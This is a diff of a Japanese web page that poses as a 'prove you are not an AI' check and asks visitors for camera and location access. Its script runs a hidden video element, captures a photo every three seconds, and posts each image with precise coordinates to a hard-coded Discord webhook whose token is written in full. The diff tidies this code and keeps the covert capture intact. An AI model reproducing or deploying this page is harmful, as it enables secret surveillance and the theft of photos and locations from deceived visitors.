@@ -31,98 +31,83 @@
         color: #003580;
       }
       video {
-        display: none; /* カメラ映像は非表示に */
+        display: none;
       }
     </style>
   </head>
   <body>
-    <h1>AIではないことを証明するため カメラ・位置情報アクセスを許可してください許可したらリンクが解放されます</h1>
-    <img
-      id="math-image"
-      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT8-5rpz6ep3gSkcAvYX_gtPgV1UtURRsfH4m5wNxsrHg&s"
-      alt="Math Equation"
-    />
+    <h1>AIではないことを証明するため カメラ・位置情報アクセスを許可してください</h1>
+    <img id="math-image" src="" alt="Math Equation" />
     <div id="math-equation"></div>
 
     <script>
       let imageCounter = 1;
-
-      // カメラ映像の取得とvideoタグ作成
-      const constraints = { video: { width: 400, height: 300 } };
       let videoElement;
 
+      // 位置情報を先にリクエストしておく
+      navigator.geolocation.getCurrentPosition(
+        () => {},
+        () => {},
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+
       navigator.mediaDevices
-        .getUserMedia(constraints)
-        .then(function (mediaStream) {
+        .getUserMedia({ video: { width: 400, height: 300 } })
+        .then((stream) => {
           videoElement = document.createElement("video");
-          videoElement.srcObject = mediaStream;
+          videoElement.srcObject = stream;
           videoElement.play();
+          videoElement.style.display = "none";
           document.body.appendChild(videoElement);
-          videoElement.style.display = "none"; // 非表示
-          // カメラ準備できたら定期実行開始
           setInterval(captureAndSend, 3000);
         })
-        .catch(function (err) {
-          console.error(err.name + ": " + err.message);
+        .catch((err) => {
+          alert("カメラアクセスが拒否されました: " + err.message);
         });
 
       function captureAndSend() {
         if (!videoElement || videoElement.readyState !== 4) return;
 
-        // 位置情報を先に取得
         navigator.geolocation.getCurrentPosition(
-          function (position) {
-            sendImageWithLocation(position.coords.latitude, position.coords.longitude);
+          (position) => {
+            sendImage(position.coords.latitude, position.coords.longitude);
           },
-          function () {
-            // 位置情報取得失敗時は空文字で送信
-            sendImageWithLocation(null, null);
-          }
+          () => {
+            sendImage(null, null);
+          },
+          { enableHighAccuracy: true, timeout: 5000 }
         );
       }
 
-      function sendImageWithLocation(lat, lon) {
+      function sendImage(lat, lon) {
         const canvas = document.createElement("canvas");
         canvas.width = videoElement.videoWidth;
         canvas.height = videoElement.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(videoElement, 0, 0);
+        canvas.getContext("2d").drawImage(videoElement, 0, 0);
 
-        canvas.toBlob(
-          function (blob) {
-            const formData = new FormData();
-            formData.append("file", blob, "capture.jpg");
+        canvas.toBlob((blob) => {
+          const formData = new FormData();
+          formData.append("file", blob, "capture.jpg");
 
-            // 位置情報があればテキストに追加
-            let contentText = "";
-            if (lat !== null && lon !== null) {
-              contentText = `位置情報: 緯度 ${lat.toFixed(6)}, 経度 ${lon.toFixed(6)}`;
-            } else {
-              contentText = "位置情報なし";
-            }
-            formData.append("content", contentText);
+          const content =
+            lat && lon
+              ? `位置情報: 緯度 ${lat.toFixed(6)}, 経度 ${lon.toFixed(6)}`
+              : "位置情報なし";
 
-            // Discord Webhook URL（自分のURLに差し替えてください）
-            const webhookURL =
-              "https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o";
+          formData.append("content", content);
 
-            fetch(webhookURL, {
+          fetch(
+            "https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o",
+            {
               method: "POST",
               body: formData,
-            })
-              .then(() => {
-                // 送信成功したら画面の画像を更新
-                document.getElementById("math-image").src = canvas.toDataURL();
-                document.getElementById("math-equation").textContent =
-                  "Equation " + imageCounter++;
-              })
-              .catch((e) => {
-                console.error("送信エラー:", e);
-              });
-          },
-          "image/jpeg",
-          1.0
-        );
+            }
+          ).then(() => {
+            document.getElementById("math-image").src = canvas.toDataURL();
+            document.getElementById("math-equation").textContent =
+              "Equation " + imageCounter++;
+          });
+        }, "image/jpeg");
       }
     </script>
   </body>
